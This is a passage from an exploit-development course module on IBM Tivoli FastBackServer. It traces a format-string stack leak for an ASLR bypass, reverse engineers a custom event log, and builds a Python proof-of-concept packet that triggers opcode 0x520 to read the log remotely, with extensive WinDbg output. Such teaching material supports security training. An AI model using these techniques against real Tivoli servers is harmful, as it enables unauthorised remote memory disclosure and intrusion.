+FastBackServer!EventLog+0x137:
+00480568 e8b0fbffff      call    FastBackServer!EventLog_wrapted (0048011d)
+
+0:006> dds esp L3
+0d95deac  00000008
+0d95deb0  00000019
+0d95deb4  0d95ded4
+
+0:006> da poi(esp+8)
+0d95ded4  "AGI_S_GetAgentSignature: couldn'"
+0d95def4  "t find agent %x%x%x%x%x%x%x%x%x%"
+0d95df14  "x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%"
+0d95df34  "x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%"
+0d95df54  "x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%"
+0d95df74  "x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%"
+0d95df94  "x%x%.."
+Listing 26 - Arguments for EventLog_wrapted
+We'll observe that the formatted string has been shortened, but is otherwise unchanged.
+Stepping into EventLog_wrapted, we'll find some initial checks followed by a large basic block that performs several string modifications. These are all outside of our influence, so we can ignore them.
+At the end of the function, we encounter a basic block that calls _ml_vsnprintf once again, as displayed in Figure 10.
+ 
+Figure 10: Second call to ml_vsnprinf
+To analyze the arguments for _ml_vsnprintf, let's single step to the call and display them.
+eax=0000002d ebx=060fae50 ecx=0d95dca5 edx=000001c7 esi=060fae50 edi=00669360
+eip=004803fa esp=0d95dc14 ebp=0d95dea4 iopl=0         nv up ei pl nz ac po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
+FastBackServer!EventLog_wrapted+0x2dd:
+004803fa e834ad1d00      call    FastBackServer!ml_vsnprintf (0065b133)
+
+0:006> dds esp L4
+0d95dc14  0d95dca5
+0d95dc18  000001c7
+0d95dc1c  0d95ded4
+0d95dc20  0d95deb8
+
+0:006> da poi(esp+8)
+0d95ded4  "AGI_S_GetAgentSignature: couldn'"
+0d95def4  "t find agent %x%x%x%x%x%x%x%x%x%"
+0d95df14  "x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%"
+0d95df34  "x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%"
+0d95df54  "x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%"
+0d95df74  "x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%"
+0d95df94  "x%x%.."
+Listing 27 - Arguments for second vsnprintf
+The formatted string from the first call to _ml_vsnprintf is indeed used as a format string. Additionally, the stack pointer present at offset 0xC from ESP will be interpreted as a pointer to an array of arguments. It is also worth noting that the result of _ml_vsnprintf is stored at the offset label Str.
+Stepping over the call will copy the contents of the arguments array into the format string and format it as hexadecimal values. Because we did not supply any arguments, vsnprintf will use any values present at that given address.
+The result of this formatting is given in Listing 28.
+0:006> p
+eax=ffffffff ebx=060fae50 ecx=0d95dbd4 edx=00000200 esi=060fae50 edi=00669360
+eip=004803ff esp=0d95dc14 ebp=0d95dea4 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+FastBackServer!EventLog_wrapted+0x2e2:
+004803ff 83c410          add     esp,10h
+
+0:006> da 0d95dca5
+0d95dca5  "AGI_S_GetAgentSignature: couldn'"
+0d95dcc5  "t find agent c4d95ded4782512e780"
+0d95dce5  "5f49474165475f53656741746953746e"
+0d95dd05  "74616e673a657275756f6320276e646c"
+0d95dd25  "696620746120646e746e656725782520"
+0d95dd45  "25782578257825782578257825782578"
+0d95dd65  "25782578257825782578257825782578"
+0d95dd85  "25782578257825782578257825782578"
+0d95dda5  "25782578257825782578257825782578"
+0d95ddc5  "25782578257825782578257825782578"
+0d95dde5  "25782578257825782578257825782578"
+0d95de05  "25782578257825782578257825782578"
+
+0:006> !teb
+TEB at 00205000
+    ExceptionList:        0d9bff38
+    StackBase:            0d9c0000
+    StackLimit:           0d95d000
+    SubSystemTib:         00000000
+    FiberData:            00001e00
+Listing 28 - Leak of stack address
+As highlighted in Listing 28, we find an address (0xd95ded4) at the beginning of the formatted hexadecimal values.
+Checking the stack limits, we can verify this address is within the limits and we have managed to leak a stack pointer.
+When developing an exploit, it is important to execute it multiple times to ensure the consistency of the stack address.
+While valid, this type of ASLR bypass is not immediately useful since the leak happens on the server, and we have no known way of obtaining the stack address after it is leaked.
+In the next sections, we'll learn more about what happens with the leaked stack address following the second vsnprintf call, and determine if we can retrieve it from our Kali machine.
+Exercise
+1.	Trace execution to the second vsnprintf call and verify that the custom format string leads to a stack leak.
+1 (cplusplus, 2020), http://www.cplusplus.com/reference/cstring/strlen/
+11.3. Reading the Event Log
+We know from the previous section that FastBackServer contains at least one format string function that can be abused to leak a stack address.
+After a stack address has been leaked inside the application, we need to find a way to retrieve it. In the next two sections, we will reverse engineer parts of a custom event log for Tivoli that will allow us to do just this.
+11.3.1. The Tivoli Event Log
+We'll need to develop an attack to return the leaked stack address to our Kali machine. To begin, let's investigate the formatted string containing our leak to determine its intended use.
+Figure 11 shows the last part of the basic block right after the second call to _ml_vsnprintf.
+ 
+Figure 11: Call to function _SFILE_Printf
+We recall that the formatted string containing our leak is stored at the offset label Str. It is passed as an argument to the _SFILE_Printf function.
+The function also takes two other strings as arguments: a format string specifier ("%s"), and a static string. Let's single-step to the call in WinDbg and dump the contents of the static string.
+eax=0d95dc78 ebx=060fae50 ecx=0d95dc78 edx=7efeff2c esi=060fae50 edi=00669360
+eip=00480425 esp=0d95dc18 ebp=0d95dea4 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+FastBackServer!EventLog_wrapted+0x308:
+00480425 e86b9b0100      call    FastBackServer!SFILE_Printf (00499f95)
+
+0:006> dds esp L3
+0d95dc18  00a99f40 FastBackServer!EventLOG_sSFILE
+0d95dc1c  0078a8b4 FastBackServer!EVENT_LOG_szModuleNames+0x718
+0d95dc20  0d95dc78
+
+0:006> da poi(esp)
+00a99f40  "C:/ProgramData/Tivoli/TSM/FastBa"
+00a99f60  "ck/server/FAST_BACK_SERVER"
+Listing 29 - Arguments for SFILE_Printf
+It seems that the first argument is a file path or folder. We can try to learn more about it by performing a directory listing of C:\ProgramData\Tivoli\TSM\FastBack\server, as shown in Listing 30.
+C:\Tools> dir C:\ProgramData\Tivoli\TSM\FastBack\server
+ Volume in drive C has no label.
+ Volume Serial Number is 4097-9145
+
+ Directory of C:\ProgramData\Tivoli\TSM\FastBack\server
+
+27/04/2020  16.30    <DIR>          .
+27/04/2020  16.30    <DIR>          ..
+27/04/2020  16.30           435.203 clog010.sf
+08/02/2020  21.52               228 conf.txt
+27/04/2020  16.30               174 conf.txt.sig
+08/02/2020  21.52               228 conf.txt.tmp
+25/04/2020  15.05               614 DebugDumpCreate.txt
+25/11/2019  21.54    <DIR>          FastBackBMR
+26/04/2020  19.21         2.560.003 FAST_BACK_SERVER030.sf
+26/04/2020  20.25         2.560.003 FAST_BACK_SERVER031.sf
+27/04/2020  08.35         2.560.003 FAST_BACK_SERVER032.sf
+27/04/2020  09.39         2.560.003 FAST_BACK_SERVER033.sf
+27/04/2020  10.44         2.560.003 FAST_BACK_SERVER034.sf
+27/04/2020  11.48         2.560.003 FAST_BACK_SERVER035.sf
+27/04/2020  12.52         2.560.003 FAST_BACK_SERVER036.sf
+27/04/2020  13.57         2.560.003 FAST_BACK_SERVER037.sf
+27/04/2020  15.01         2.560.003 FAST_BACK_SERVER038.sf
+27/04/2020  16.06         2.560.003 FAST_BACK_SERVER039.sf
+27/04/2020  22.13           622.851 FAST_BACK_SERVER040.sf
+...
+Listing 30 - Multiple files with custom names
+Listing the directory reveals multiple files that match the argument from _SFILE_Printf, as well as a suffix and the .sf extension.
+The number of files with the name varies depending on the length of time FastBackServer has been installed on the system.
+This gives us the suspicion that the contents of our format string may be written to one of these files. If we inspect the last file, we discover a massive amount of logged information:
+C:\Tools> more C:\ProgramData\Tivoli\TSM\FastBack\server\FAST_BACK_SERVER040.sf
+∩╗┐[Apr 27 16:06:06:960]( ebc)->I4.MGR          :       CHAIN_MGR_S_CheckSanityStatusAfterReset: Sanity status is [2], waiting for change is status                                                                                             
+[Apr 27 16:06:07:475]( ebc)->I4.MGR             :       CHAIN_MGR_S_CheckSanityStatusAfterReset: Sanity status is [2], waiting for change is status                                                                                             
+[Apr 27 16:06:07:991]( ebc)->I4.MGR             :       CHAIN_MGR_S_CheckSanityStatusAfterReset: Sanity status is [2], waiting for change is status                                                                                             
+[Apr 27 16:06:08:069]( b94)->I4.FSI             :       REP_FSI_S_GetFullPath: File [{}dummy.txt] use size [0]  
+...
+Listing 31 - Contents of FAST_BACK_SERVER040.sf
+We can create a hypothesis that Tivoli maintains a custom event log and the purpose of the _EventLog function is to write events to it. This means that our formatted string containing a stack leak should also be written to it.
+To test this hypothesis, we can navigate into _SFILE_Printf with IDA Pro. At the beginning of the function, we locate multiple basic blocks that call the _ml_open function, as shown in Figure 12.
+ 
+Figure 12: Call to function ml_open
+If we dig into _ml_open, we find it is a wrapper function for wopen1 (Figure 13), which is used to open a file and obtain a handle to it.
+ 
+Figure 13: ml_open is a wrapper for wopen
+To obtain the filename, we can single step in WinDbg until we reach the call to _ml_open and dump the arguments.
+eax=00000040 ebx=060fae50 ecx=0d95d14c edx=0d95da08 esi=060fae50 edi=00669360
+eip=0049a13b esp=0d95d1a0 ebp=0d95dc10 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+FastBackServer!SFILE_Printf+0x1a6:
+0049a13b e82a081c00      call    FastBackServer!ml_open (0065a96a)
+
+0:006> dds esp L3
+0d95d1a0  0d95da08
+0d95d1a4  00000102
+0d95d1a8  00000180
+
+0:006> da poi(esp)
+0d95da08  "C:/ProgramData/Tivoli/TSM/FastBa"
+0d95da28  "ck/server/FAST_BACK_SERVER040.sf"
+0d95da48  ""
+Listing 32 - Arguments to ml_open
+We'll note the full name of the custom event log file as C:/ProgramData/Tivoli/TSM/FastBack/server/FAST_BACK_SERVER040.sf, which is supplied to _ml_open.
+When a function opens a file, it will typically either read from it or write to it. While SFILE_Printf is a large function, a quick browse in IDA Pro reveals several basic blocks with calls to _fwrite,2 which is typically used to write data to a file.
+An example of one of these basic blocks is shown in Figure 14.
+ 
+Figure 14: One of the calls to fwrite inside SFILE_Printf
+Instead of analyzing the rest of _SFILE_Printf, let's attempt to speed up our analysis by letting it execute to the end.
+Once the function is complete, we'll open a PowerShell prompt and list the last entry in the custom event log. We can list this entry by using the Get-Content cmdlet3 with the -Tail option and a value of "1".
+PS C:\Tools> Get-Content C:\ProgramData\Tivoli\TSM\FastBack\server\FAST_BACK_SERVER040.sf -Tail 1
+[Apr 28 00:21:55:849](1910)-->W8.AGI            :       AGI_S_GetAgentSignature: couldn't find agent c4d95ded4782512e7805f49474165475f53656741746953746e74616e673a657275756f6320276e646c696620746120646e746e65672578252025782578257825782578257825782578257825782578257825
+Listing 33 - Formatted string as an event entry
+We confirm that this is our formatted string and that it still contains the leaked stack address. This proves that our hypothesis was correct!
+In this section, we discovered that the Tivoli application maintains a custom event log, and confirmed that our formatted string containing a leaked stack address is written to it. Next, we need to find a way to obtain content from the custom event log remotely.
+Exercise
+1.	Follow the analysis to uncover the custom event log and locate the stack leak written to it.
+1 (Microsoft, 2016), https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/open-wopen?view=msvc-160
+2 (cplusplus, 2020), http://www.cplusplus.com/reference/cstdio/fwrite/
+3 (Microsoft, 2020), https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-content?view=powershell-7
+11.3.2. Remote Event Log Service
+In the previous section, we found that when _EventLog is called, the supplied string is formatted and subsequently written to the custom event log. We leveraged this by sending a network packet and forced a stack address to be written to the event log.
+To move forward with this exploit and bypass ASLR, we need to retrieve contents from the custom event log by sending another network packet. We will uncover a way to access the event log remotely in this and the following sections.
+So far, the vulnerability we used has only triggered a write to the event log. There is no way to directly retrieve the log because it is stored locally on the server. Instead, we will need to locate a different code path to access the event log.
+To start, let's remember that when _SFILE_Printf is called, a global variable containing a part of the log file name is supplied as an argument. This is also shown in Figure 15.
+ 
+Figure 15: Global variable with event log file name
+Logically, it makes sense that if an application maintains a custom event log, it also contains a function to read the log.
+Since this event log is likely shared across all processes related to Tivoli and not just used by FastBackServer, we are not guaranteed that it will contain a function to read it. If FastBackServer does contain this functionality, it stands to reason that the same global variable would be used.
+To find out if this functionality exists, let's perform a cross-reference from EventLOG_sSFILE. We find five usages, as displayed in Figure 16.
+ 
+Figure 16: Cross references to the global variable
+We'll notice that based on the function names, there are only two locations that do not seem directy related to the event log. Both usages are in FXCLI_OraBR_Exec_Command, which might allow us to reach them.
+If we start by jumping to the address of the cross reference at the bottom, we'll find the basic block given in Figure 17.
+ 
+Figure 17: Erase event log option?
+It seems that the code path leading to this basic block deletes the content of the custom event log. This may indicate a security weakness, since an unauthenticated user can delete the event log, but this is not useful for us at the moment. Let's inspect the other cross-reference instead.
+The other cross-reference leads us to a few basic blocks that perform a series of checks, after which they reach the code shown in Figure 18.
+ 
+Figure 18: Call to _SFILE_ReadBlock
+The function name _SFILE_ReadBlock sounds promising. Entering into the function, we find additional checks, and further down we notice a call to fread1 (Figure 19), which is used to read from a file.
+ 
+Figure 19: Call to fread inside _SFILE_ReadBlock
+Given the presence of the fread call and usage of the custom event log file path, it seems as though the _SFILE_ReadBlock function may read from the event log.
+Next, we need to find the opcode that will allow us to create a proof of concept and trigger this function.
+Locating the opcode is not particularly straightforward, so we'll need to perform some analysis. First, we will go back to where the global variable containing the file path was used. From this location, we can follow the code backward to find an important basic block, as shown in Figure 20.
+ 
+Figure 20: Basic block one backwards from desired code path
+We'll observe two interesting things about the basic block.
+First, when we followed execution backwards, it was from the code path that is taken when the JNZ shown in Figure 20 is not taken. This means that the variable used in the comparison must contain the value "1".
+Since the address at offset var_5575C is used as an output buffer for sccanf and in the subsequent comparison, we'll need to provide a correct format string to it.
+Second, the comment in the first line of the basic block reveals that the current basic block is reached from a switch statement as case number 8.
+We can backtrack one basic block to locate the assembly code, as given in Figure 21.
+ 
+Figure 21: Switch statement
+Let's examine how this jump table works. First, the switch value is moved into ECX and EAX is set to zero through the xor instruction.
+Next, the global variable byte_575F6E acts as an array that we index into based on the switch value in ECX. The byte at the requested index is moved into AL.
+The retrieved value in AL is next used as an index in the off_575F06 array, followed by the JMP instruction to transfer execution.
+From the auto-analysis performed by IDA Pro, we already know that we need a switch value of 8 to reach the correct code path.
+We can now move backward one more basic block in search of the opcode value. We'll find the basic block shown in Figure 22. In this basic block, we'll notice the opcode value is being moved from EBP+var_61B30 into EDX, after which 0x518 is subtracted from it.
+ 
+Figure 22: 0x518 subtracted from opcode value
+This means we need to supply an opcode of 0x520 to trigger the event log file read code path.
+0:006> ? 0x520- 0x518
+Evaluate expression: 8 = 00000008
+Listing 34 - Calculation for opcode value
+We are now ready to create the code needed to trigger the correct opcode and supplement our static analysis with some dynamic analysis. The code required to trigger opcode 0x520 is a repeat of the basic framework we have used before.
+Listing 35 shows the relevant psAgentCommand and psCommandBuffer buffers.
+...
+# psAgentCommand
+buf = pack(">i", 0x400)
+buf += bytearray([0x41]*0xC)
+buf += pack("<i", 0x520)  # opcode
+buf += pack("<i", 0x0)    # 1st memcpy: offset
+buf += pack("<i", 0x100)  # 1st memcpy: size field
+buf += pack("<i", 0x100)  # 2nd memcpy: offset
+buf += pack("<i", 0x100)  # 2nd memcpy: size field
+buf += pack("<i", 0x200)  # 3rd memcpy: offset
+buf += pack("<i", 0x100)  # 3rd memcpy: size field
+buf += bytearray([0x41]*0x8)
+
+# psCommandBuffer
+buf += b"A" * 0x100  
+buf += b"B" * 0x100 
+buf += b"C" * 0x100 
+
+# Padding
+buf += bytearray([0x41]*(0x404-len(buf)))
+...
+Listing 35 - Proof of concept to trigger opcode 0x520
+To verify that this is the correct opcode, we can set a breakpoint on the basic block that performs the call to sscanf. Referencing this in IDA Pro yields the address 0x570E30 in FastBackServer.
+When the breakpoint is set, we can execute the proof of concept and send the network packet.
+0:001> bc *
+
+0:001> bp 570e30
+
+0:001> g
+Breakpoint 0 hit
+eax=00000002 ebx=060fae50 ecx=00000008 edx=00000008 esi=060fae50 edi=00669360
+eip=00570e30 esp=0da5e334 ebp=0dabfe98 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+FastBackServer!FXCLI_OraBR_Exec_Command+0x497a:
+00570e30 8d959ca8faff    lea     edx,[ebp-55764h]
+Listing 36 - Hitting the breakpoint with opcode 0x520
+The breakpoint triggers, showing that we have successfully navigated into the right code path.
+Now that we can gain execution on the correct code path, we must reach the call to _SFILE_ReadBlock. Our next challenge to solve is the call to sscanf, repeated in Figure 23.
+ 
+Figure 23: Call to sscanf and subsequent comparison
+We'll recall that the JNZ must not be taken to reach the basic block that calls _SFILE_ReadBlock. This means that the value at EBP+var_5575C must be equal to "1".
+To understand how we can achieve this, let's reexamine the function prototype of sscanf.
+int sscanf ( const char * s, const char * format, ...);
+Listing 37 - Function prototype of sscanf
+The first argument is the input string that must be processed. The second argument is the format string, and any subsequent arguments are used to store the associated values from the input string.
+Let's single step to the call into sscanf to figure out where the input string comes from.
+eax=0da6a738 ebx=060fae50 ecx=0da6a73c edx=0dab3b30 esi=060fae50 edi=00669360
+eip=00570e51 esp=0da5e320 ebp=0dabfe98 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+FastBackServer!FXCLI_OraBR_Exec_Command+0x499b:
+00570e51 e8cf660f00      call    FastBackServer!sscanf (00667525)
+
+0:001> dd poi(esp) L4
+0dab3b30  41414141 41414141 41414141 41414141
+
+0:001> da poi(esp+4)
+00858598  "FileType: %d ,Start: %d, Length:"
+008585b8  " %d"
+Listing 38 - Arguments for sscanf
+From here, the input string is the first part of the psCommandBuffer that is used with the sscanf call.
+As shown in previous modules, the input string must contain the same text as the format string for sscanf to correctly parse it. This means that we must modify the first part of the psCommandBuffer to contain the format string and insert values associated with the decimal format string specifiers.
+Listing 39 shows the updated psCommandBuffer.
+# psCommandBuffer
+buf += b"FileType: %d ,Start: %d, Length: %d" % (1, 0x100, 0x200)  
+buf += b"B" * 0x100 
+buf += b"C" * 0x100 
+Listing 39 - Updated psCommandBuffer
+We'll use the required value of "1" along with 0x100 and 0x200 for the three decimal values that are parsed from the input string. Choosing different values for each makes it easier to find where each of them is used later.
+Next, we can set a breakpoint on the call instruction into sscanf and send the updated packet.
+0:001> bc *
+
+0:001> bp FastBackServer!FXCLI_OraBR_Exec_Command+0x499b
+
+0:001> g
+Breakpoint 0 hit
+eax=0db6a738 ebx=060fae50 ecx=0db6a73c edx=0dbb3b30 esi=060fae50 edi=00669360
+eip=00570e51 esp=0db5e320 ebp=0dbbfe98 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+FastBackServer!FXCLI_OraBR_Exec_Command+0x499b:
+00570e51 e8cf660f00      call    FastBackServer!sscanf (00667525)
+
+0:001> dds esp L5
+0db5e320  0dbb3b30
+0db5e324  00858598 FastBackServer!FX_CLI_JavaVersion+0x1f80
+0db5e328  0db6a73c
+0db5e32c  0db6a738
+0db5e330  0db6a734
+
+0:001> da poi(esp)
+0dbb3b30  "FileType: 1 ,Start: 256, Length:"
+0dbb3b50  " 512BBBBBBBBBBBBBBBBBBBBBBBBBBBB"
+0dbb3b70  "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
+0dbb3b90  "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
+0dbb3bb0  "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
+0dbb3bd0  "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
+0dbb3bf0  "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
+0dbb3c10  "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
+0dbb3c30  ""
+Listing 40 - Updated arguments for sscanf
+We'll note that our input buffer now contains a valid string. The three output buffers for sscanf, given by the three-argument pointers, are also highlighted in the listing above.
+Once we step over the call to sscanf the three decimal values are copied into the output buffers, as shown in Listing 41.
+0:001> p
+eax=00000003 ebx=060fae50 ecx=0db5e2f8 edx=0db5e2f8 esi=060fae50 edi=00669360
+eip=00570e56 esp=0db5e320 ebp=0dbbfe98 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+FastBackServer!FXCLI_OraBR_Exec_Command+0x49a0:
+00570e56 83c414          add     esp,14h
+
+0:001> dd 0db6a73c L1
+0db6a73c  00000001
+
+0:001> dd 0db6a738 L1
+0db6a738  00000100
+
+0:001> dd 0db6a734 L1
+0db6a734  00000200
+Listing 41 - Parsed values from sscanf
+With the decimal value 1 parsed correctly, let's clear the comparison and continue towards the basic block that calls SFILE_ReadBlock.
+On the way there, we encounter multiple checks that use the two other parsed decimal values. Let's make a note of this and check it later. We can continue until we reach the call:
+eax=018943a8 ebx=060fae50 ecx=00000100 edx=00000200 esi=060fae50 edi=00669360
+eip=00570f03 esp=0db5e324 ebp=0dbbfe98 iopl=0         nv up ei ng nz ac pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000297
+FastBackServer!FXCLI_OraBR_Exec_Command+0x4a4d:
+00570f03 e8008ef2ff      call    FastBackServer!SFILE_ReadBlock (00499d08)
+
+0:001> dds esp L4
+0db5e324  00000100
+0db5e328  018943a8
+0db5e32c  00000200
+0db5e330  00a99f40 FastBackServer!EventLOG_sSFILE
+Listing 42 - Arguments for SFILE_ReadBlock
+From the arguments supplied to SFILE_ReadBlock, shown in Listing 42, we find that only the first and third arguments are under our control.
+We have succeeded in reaching the correct function with arguments that seem valid. Next, we will examine exactly what the SFILE_ReadBlock function does.
+Exercise
+1.	Follow and repeat the analysis to obtain a proof of concept that triggers the correct opcode and passes the checks.
+1 (cplusplus, 2020), http://www.cplusplus.com/reference/cstdio/fread/
+11.3.3. Read From an Index
+In this section, we will analyze what the SFILE_ReadBlock function does, and what the supplied arguments represent.
+We'll start by stepping into SFILE_ReadBlock. After some initial checks, we reach a call to SFILE_S_FindFileIndexForRead, as given in Figure 24.
+ 
+Figure 24: Call to SFILE_S_FindFileIndexForRead
+Given the name of the function and the goal of reading from the event log, it seems likely that SFILE_S_FindFileIndexForRead will find an index that determines which entries can be read.
+Let's move execution to this point in WinDbg and inspect the arguments to the function.
+0:006> bp FastBackServer!SFILE_ReadBlock+0xa8
+
+0:006> g
+Breakpoint 1 hit
+...
+eax=00000100 ebx=060fae50 ecx=00a99f40 edx=0db5e318 esi=060fae50 edi=00669360
+eip=00499db0 esp=0db5e0ec ebp=0db5e31c iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+FastBackServer!SFILE_ReadBlock+0xa8:
+00499db0 e807feffff      call    FastBackServer!SFILE_S_FindFileIndexForRead (00499bbc)
+
+0:001> dds esp L4
+0db5e0ec  00a99f40 FastBackServer!EventLOG_sSFILE
+0db5e0f0  00000100
+0db5e0f4  0db5e318
+0db5e0f8  0db5e108
+Listing 43 - Arguments for SFILE_S_FindFileIndexForRead
+The only argument we control is the second formatted decimal value. We'll recall that in the format string, it was labeled Start.
+buf += b"FileType: %d ,Start: %d, Length: %d" % (1, 0x100, 0x200)
+Listing 44 - Format string in our PoC
+This suggests that the value directs where SFILE_ReadBlock will read from in the event log.
+Before moving into the function, we should note that its return value determines whether SFILE_ReadBlock triggers the JNZ. Figure 25 shows the graph overview of SFILE_ReadBlock.
+ 
+Figure 25: Failure path inside SFILE_ReadBlock
+The highlighted portion in the figure above shows the path if the jump is not taken, which leads to a premature exit from SFILE_ReadBlock.
+To go further into SFILE_ReadBlock, the return value from SFILE_S_FindFileIndexForRead must be non-zero.
+Stepping into SFILE_S_FindFileIndexForRead, we encounter some initial bound checks on the Start value. Next we'll enter a large loop, as shown in Figure 26.
+ 
+Figure 26: Loop inside SFILE_S_FindFileIndexForRead
+The logic within this loop has multiple implications, so let's start at a high level and then dig into some of the details.
+We already know that SFILE_S_FindFileIndexForRead must exit with a non-zero result. Inspecting the code in the three red color-coded basic blocks on the right-hand side would show that they return a zero result.
+This leaves only one successful exit from the loop, the green color-coded basic block on the left-hand side in Figure 26.
+Now that we have a general roadmap of where we want to end up, let's recall a couple of facts we discovered earlier. We found multiple event log files, and the entry containing the leaked stack address was added as the newest entry in the file with the number suffix of 40.
+Listing 45 repeats the prior file listings for the event log directory.
+C:\Tools> dir C:\ProgramData\Tivoli\TSM\FastBack\server
+ Volume in drive C has no label.
+ Volume Serial Number is 4097-9145
+
+ Directory of C:\ProgramData\Tivoli\TSM\FastBack\server
+
+...
+26/04/2020  19.21         2.560.003 FAST_BACK_SERVER030.sf
+26/04/2020  20.25         2.560.003 FAST_BACK_SERVER031.sf
+27/04/2020  08.35         2.560.003 FAST_BACK_SERVER032.sf
+27/04/2020  09.39         2.560.003 FAST_BACK_SERVER033.sf
+27/04/2020  10.44         2.560.003 FAST_BACK_SERVER034.sf
+27/04/2020  11.48         2.560.003 FAST_BACK_SERVER035.sf
+27/04/2020  12.52         2.560.003 FAST_BACK_SERVER036.sf
+27/04/2020  13.57         2.560.003 FAST_BACK_SERVER037.sf
+27/04/2020  15.01         2.560.003 FAST_BACK_SERVER038.sf
+27/04/2020  16.06         2.560.003 FAST_BACK_SERVER039.sf
+27/04/2020  22.13           622.851 FAST_BACK_SERVER040.sf
+...
+Listing 45 - Multiple event log files of same size
+From the listing, we'll note that all event log files with a suffix lower than 40 are the same size. We will also find, if we recheck the event logs present in the directory multiple times while the application is running, that no file with a suffix greater than 40 exists. On the contrary, event files with decreasing numerical suffixes appear.
+Given these facts, our initial thought is that the first log file to be created is the log file with a suffix of 40. When it reaches its maximum size, it is renamed to 39, and a new log file with a suffix of 40 is created. This would continue until the suffix value reaches zero, and then it would eventually be overwritten by newer data.
+We are currently interested in reading from the newest file, and the only argument we can control is the Start value. It makes sense that this value will control where we read from.
+With a high-level understanding of how the event log works, let's explore what's happening inside the loop.
+Just before entering the loop, we find the uppermost basic block displayed in Figure 27.
+ 
+Figure 27: Initial loop condition
+In this basic block, a value is moved into EDX and subsequently onto the stack. It is then used as a comparison against 0.
+To discover the value at runtime, we will step into SFILE_S_FindFileIndexForRead with WinDbg and go to the comparison as shown in Listing 46.
+eax=0005fe36 ebx=060fae50 ecx=00a99f40 edx=00000028 esi=060fae50 edi=00669360
+eip=00499c12 esp=0db5deac ebp=0db5e0e4 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+FastBackServer!SFILE_S_FindFileIndexForRead+0x56:
+00499c12 83bdccfdffff00  cmp     dword ptr [ebp-234h],0 ss:0023:0db5deb0=00000028
+Listing 46 - Comparison on file suffix
+We'll find the value 0x28 or decimal 40, which is the maximum suffix value.
+The comparison in this basic block controls the iterations through the loop. It is likely the assembly code stemming from a compiled C-style while loop, as illustrated in Listing 47.
+while(file_suffix > 0)
+{
+ // Action in loop
+}
+Listing 47 - C pseudocode for while loop
+The loop starts with the maximum suffix value of the event log files, so we can suspect that the purpose of the loop is to determine which log file to read from.
+To help in our analysis, let's try to put ourselves into the shoes of the developer. One way to programmatically figure out which file to read from is to use the Start value as an index.
+Listing 48 shows an example of C pseudocode for accomplishing this.
+index = total log size 
+while(file_suffix > 0)
+{
+  index = index - sizeof(current log file)
+  if(Start value >= index)
+  {
+    // We found the right log file
+  }
+  go to next log file
+}
+Listing 48 - C pseudocode for function of loop
+We'll begin by getting the size of all log files, then subtracting the size of the current log file and checking if the supplied Start value is greater. If it is, we want to read from the current log file. If it is not greater, we'll go to the next log file.
+Programming knowledge can help us understand how a developer might implement a specific piece of functionality.
+Let's test if our pseudocode is accurate by going through the contents of the loop.
+Inside the loop, we will first come across a call to the snprintf1 format string function, as shown in Figure 28.
+ 
+Figure 28: Call to snprintf
+To better understand this call, the function prototype for snprintf is given below:
+int snprintf ( char * s, size_t n, const char * format, ... );
+Listing 49 - Function prototype for snprintf
+The first two arguments are the destination buffer and the maximum number of bytes to be used in the buffer. This is followed by the format string, in this case, "%s%03u%s" as displayed in Figure 28, and the associated arguments for the format string specifiers.
+Let's step to the call in WinDbg to check the supplied arguments.
+eax=0db5dedc ebx=060fae50 ecx=00000028 edx=00a99f40 esi=060fae50 edi=00669360
+eip=00499c40 esp=0db5de94 ebp=0db5e0e4 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+FastBackServer!SFILE_S_FindFileIndexForRead+0x84:
+00499c40 e866021c00      call    FastBackServer!ml_snprintf (00659eab)
+
+0:001> dds esp L6
+0db5de94  0db5dedc
+0db5de98  00000208
+0db5de9c  00798c28 FastBackServer!securityLevel+0x51e4
+0db5dea0  00a99f40 FastBackServer!EventLOG_sSFILE
+0db5dea4  00000028
+0db5dea8  00798c24 FastBackServer!securityLevel+0x51e0
+
+0:001> da 00798c28
+00798c28  "%s%03u%s"
+
+0:001> da 00a99f40
+00a99f40  "C:/ProgramData/Tivoli/TSM/FastBa"
+00a99f60  "ck/server/FAST_BACK_SERVER"
+Listing 50 - Format string to create file name
+Given the arguments, it appears that snprintf creates the full log filename for each iteration of the loop.
+We can step over the call to find the file name in the first iteration of the loop.
+0:001> p
+eax=00000040 ebx=060fae50 ecx=0db5de4c edx=0db5df1b esi=060fae50 edi=00669360
